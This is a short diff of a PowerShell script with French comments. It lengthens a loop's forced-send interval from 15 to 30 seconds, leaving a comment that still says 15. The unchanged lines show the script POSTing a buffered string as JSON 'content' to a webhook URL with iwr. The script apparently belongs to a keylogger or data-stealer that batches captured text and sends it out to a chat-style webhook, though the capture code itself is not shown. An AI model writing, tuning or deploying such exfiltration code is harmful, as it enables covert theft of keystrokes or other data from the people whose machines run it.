@@ -46,7 +46,7 @@ while ($true) {
     }
 
     # Envoi forcé toutes les 15 secondes, même si buffer < 40
-    if (((Get-Date) - $lastSend).TotalSeconds -ge 15) {
+    if (((Get-Date) - $lastSend).TotalSeconds -ge 30) {
         if ($buffer.Length -gt 0) {
             iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
         } else {
@@ -56,3 +56,4 @@ while ($true) {
         $lastSend = Get-Date
     }
 }
+
